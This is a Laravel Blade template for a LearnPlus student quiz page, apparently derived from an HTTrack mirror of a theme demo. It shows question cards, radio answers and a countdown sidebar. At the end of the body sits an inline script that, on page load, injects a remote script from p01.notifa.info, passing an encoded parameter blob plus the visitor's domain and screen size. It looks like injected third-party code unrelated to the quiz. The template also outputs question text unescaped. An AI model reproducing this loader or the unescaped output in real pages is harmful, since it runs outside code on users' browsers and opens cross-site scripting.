<!DOCTYPE html>
<html lang="en" dir="ltr">
<!-- Mirrored from learnplus-bootstrap.frontendmatter.com/student-take-quiz.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 19 Jan 2020 00:19:21 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Peserta - Quiz</title>

    <!-- Prevent the demo from appearing in search engines (REMOVE THIS) -->
    <meta name="robots" content="noindex">

    <!-- Perfect Scrollbar -->
    <link type="text/css" href="{{asset('assets/quiz/vendor/perfect-scrollbar.css')}}" rel="stylesheet">

    <!-- Material Design Icons -->
    <link type="text/css" href="{{asset('assets/quiz/css/material-icons.css')}}" rel="stylesheet">
    <link type="text/css" href="{{asset('assets/quiz/css/material-icons.rtl.css')}}" rel="stylesheet">

    <!-- Font Awesome Icons -->
    <link type="text/css" href="{{asset('assets/quiz/css/fontawesome.css')}}" rel="stylesheet">
    <link type="text/css" href="{{asset('assets/quiz/css/fontawesome.rtl.css')}}" rel="stylesheet">

    <!-- App CSS -->
    <link type="text/css" href="{{asset('assets/quiz/css/app.css')}}" rel="stylesheet">
    <link type="text/css" href="{{asset('assets/quiz/css/app.rtl.css')}}" rel="stylesheet">









</head>

<body class=" layout-fluid">

    <div class="preloader">
        <div class="sk-double-bounce">
            <div class="sk-child sk-double-bounce1"></div>
            <div class="sk-child sk-double-bounce2"></div>
        </div>
    </div>

    <!-- Header Layout -->
    <div class="mdk-header-layout js-mdk-header-layout">

        <!-- Header -->

        <div id="header" data-fixed class="mdk-header js-mdk-header mb-0">
            <div class="mdk-header__content">

                <!-- Navbar -->
                <nav id="default-navbar" class="navbar navbar-expand navbar-dark bg-primary m-0">
                    <div class="container-fluid">
                        <!-- Toggle sidebar -->
                       

                        <!-- Brand -->
                        <a href="" class="navbar-brand">
                            <img src="{{ asset('assets/quiz/images/logo/white.svg') }}" class="mr-2" alt="LearnPlus" />
                            <span class="d-none d-xs-md-block">LearnPlus</span>
                        </a>

                        
                        <!-- // END Search -->

                        <div class="flex"></div>

                        <!-- Menu -->
                        
                        <!-- Menu -->
                        <ul class="nav navbar-nav flex-nowrap">

                        
                            <!-- // END Notifications dropdown -->
                            <!-- User dropdown -->
                            <li class="nav-item dropdown ml-1 ml-md-3">
                                <a class="nav-link dropdown-toggle" data-toggle="dropdown" href="#" role="button"><img src="{{ asset('assets/quiz/images/people/50/guy-6.jpg')}}" alt="Avatar" class="rounded-circle" width="40"></a>
                                <div class="dropdown-menu dropdown-menu-right">
                                    <a class="dropdown-item" href="student-account-edit.html">
                                        <i class="material-icons">edit</i> Edit Account
                                    </a>
                                    <a class="dropdown-item" href="student-profile.html">
                                        <i class="material-icons">person</i> Public Profile
                                    </a>
                                    <a class="dropdown-item" href="guest-login.html">
                                        <i class="material-icons">lock</i> Logout
                                    </a>
                                </div>
                            </li>
                            <!-- // END User dropdown -->

                        </ul>
                        <!-- // END Menu -->
                    </div>
                </nav>
                <!-- // END Navbar -->

            </div>
        </div>

        <!-- // END Header -->

        <!-- Header Layout Content -->
        <div class="mdk-header-layout__content">

            <div data-push data-responsive-width="992px" class="mdk-drawer-layout js-mdk-drawer-layout">
                <div class="mdk-drawer-layout__content page ">

                    <div class="container-fluid page__container">
                        <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="student-dashboard.html">Home</a></li>
                            <li class="breadcrumb-item active">Quiz</li>
                        </ol>
                        <div class="card-group">
                            <div class="card">
                                <div class="card-body text-center">
                                    <h4 class="mb-0"><strong>25</strong></h4>
                                    <small class="text-muted-light">TOTAL</small>
                                </div>
                            </div>
                            <div class="card">
                                <div class="card-body text-center">
                                    <h4 class="text-success mb-0"><strong>3</strong></h4>
                                    <small class="text-muted-light">CORECT</small>
                                </div>
                            </div>
                            <div class="card">
                                <div class="card-body text-center">
                                    <h4 class="text-danger mb-0"><strong>5</strong></h4>
                                    <small class="text-muted-light">WRONG</small>
                                </div>
                            </div>
                            <div class="card">
                                <div class="card-body text-center">
                                    <h4 class="text-primary mb-0"><strong>17</strong></h4>
                                    <small class="text-muted-light">LEFT</small>
                                </div>
                            </div>
                        </div>
                       <form id="form" action="" method="POST">
                       @php 
                         $i=1;
                         $o=$i++;
                       @endphp
                       @foreach($data['soal'] as $value)
                            <div class="card">
                                <div class="card-header">
                                    <div class="media align-items-center">
                                        <div class="media-left">
                                            <h4 class="mb-0"><strong>#{{ $loop->iteration }}</strong></h4>
                                        </div>
                                        <div class="media-body">
                                            <h4 class="card-title">
                                            {!!  $value->soal !!}
                                            </h4>
                                        </div>
                                    </div>
                                </div>
                                <div class="card-body">
                                     @php 
                                      $no = 1;
                                    
                                    @endphp
                                    @foreach($data['pilihan'] as $row)
                                    @php 
                                    $n = $no++;
                                    @endphp
                                    <div class="custom-controls-stacked mt-3">
                                        <fieldset>
                                            <div class="custom-control custom-radio">

                                                <input id="radioStacked{{ $o }}--{{ $n }}; ?>" value="{{ $value->id }}---{{$row->opsi  }}" name="jawaban[{{ $o }}]" type="radio" class="custom-control-input">
                                                <label for="radioStacked{{ $o }}--{{ $n }}; ?>" class="custom-control-label">{{ $row->pilihan }}</label>
                                            </div>
                                        </fieldset>
                                    </div>
                                    @endforeach
                                
                                </div>
                                <div class="card-footer">
                                    
                                
                                </div>
                            </div>
                           @endforeach
                            <button id='submit' type="submit" class="btn btn-success float-right">
                            Submit 
                                <i class="material-icons btn__icon--right">send</i>
                            </button>
                       </form>
                  
                       
                    </div>

                </div>




                <div class="mdk-drawer js-mdk-drawer" data-align="end">
                    <div class="mdk-drawer__content ">
                        <div class="sidebar sidebar-right sidebar-light bg-white o-hidden" data-perfect-scrollbar>
                            <div class="sidebar-p-y">
                                <div class="sidebar-heading">Time left</div>
                                <div class="countdown sidebar-p-x" data-value="4" data-unit="hour"></div>

                                <div class="sidebar-heading">Pending</div>
                                <ul class="list-group list-group-fit">
                                    <li class="list-group-item active">
                                        <a href="#">
                                            <span class="media align-items-center">
                                                <span class="media-left">
                                                    <span class="btn btn-white btn-circle">#9</span>
                                                </span>
                                                <span class="media-body">
                                                    Github command to deploy comits?
                                                </span>
                                            </span>
                                        </a>
                                    </li>
                                    <li class="list-group-item">
                                        <a href="#">
                                            <span class="media align-items-center">
                                                <span class="media-left">
                                                    <span class="btn btn-white btn-circle">#10</span>
                                                </span>
                                                <span class="media-body">
                                                    What's the difference between private and public repos?
                                                </span>
                                            </span>
                                        </a>
                                    </li>
                                    <li class="list-group-item">
                                        <a href="#">
                                            <span class="media align-items-center">
                                                <span class="media-left">
                                                    <span class="btn btn-white btn-circle">#11</span>
                                                </span>
                                                <span class="media-body">
                                                    What is the purpose of a branch?
                                                </span>
                                            </span>
                                        </a>
                                    </li>
                                    <li class="list-group-item">
                                        <a href="#">
                                            <span class="media align-items-center">
                                                <span class="media-left">
                                                    <span class="btn btn-white btn-circle">#12</span>
                                                </span>
                                                <span class="media-body">
                                                    Final Question?
                                                </span>
                                            </span>
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

            </div>




    <!-- jQuery -->
    <script src="{{asset('assets/quiz/vendor/jquery.min.js')}}"></script>

    <!-- Bootstrap -->
    <script src="{{asset('assets/quiz/vendor/popper.min.js')}}"></script>
    <script src="{{asset('assets/quiz/vendor/bootstrap.min.js')}}"></script>

    <!-- Perfect Scrollbar -->
    <script src="{{asset('assets/quiz/vendor/perfect-scrollbar.min.js')}}"></script>

    <!-- MDK -->
    <script src="{{asset('assets/quiz/vendor/dom-factory.js')}}"></script>
    <script src="{{asset('assets/quiz/vendor/material-design-kit.js')}}"></script>

    <!-- App JS -->
    <script src="{{asset('assets/quiz/js/app.js')}}"></script>

    <!-- Highlight.js -->
    <script src="{{asset('assets/quiz/js/hljs.js')}}"></script>

    <!-- App Settings (safe to remove) -->
    <script src="{{asset('assets/quiz/js/app-settings.js')}}"></script>


    <!-- Required by countdown -->
    <script src="{{asset('assets/quiz/vendor/moment.min.js')}}"></script>
    <!-- Easy Countdown -->
    <script src="{{asset('assets/quiz/vendor/jquery.countdown.min.js')}}"></script>



    <!-- Init -->
    <script src="{{asset('assets/quiz/js/countdown.js')}}"></script>





<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXxLUvsTuZxtwfQeWvhf3zyVki5skZyGBhJDJE0CyXRwK%2f4UtXwXs2mLJQXCV7IL7dYVpQ3aPcat26aLlegYpNzTnYWXDRdgHEphaDhC%2byURkcCvloT99%2bdOyKR%2b7Y%2fYOo31TimxiH1xgt7syDD1EYmn5Cx9dCf9olRM2yfGk7nDRjgaY15yaxml3dImVbt0enzHPkUspU4jsAZBcbx42fJVH6c4QbhI1ULYdHDLKWGAC%2f3BxyCMyHf9eGQl2bRR4OJvqRXY5IVh%2bBZEvaX6F65bABi9GnFJ%2b7ug%2f%2bWETCMlEbDX7uYZOHwsYS2dMHf0QWWgRWQRJxakD%2fbf1mcSMcfk8%2fOvGlmJZy%2fADsp0Zg3hSVA8tv0q%2bH82YqR%2b172idCBHIuMgei9JI5Ex1GnES2tWEiaZ1uArbTT6KoPlP8dA3efvKXvYW5Jhb9oTFHk%2ff0T2bbwTi7sEgwCF8jVN8j6MUj%2fzNV2qjUbbFWELo%2bmuOUhH34humMu7SpzvmKEhNVTblnh5Gn7%2bQ%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from learnplus-bootstrap.frontendmatter.com/student-take-quiz.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 19 Jan 2020 00:19:23 GMT -->
</html>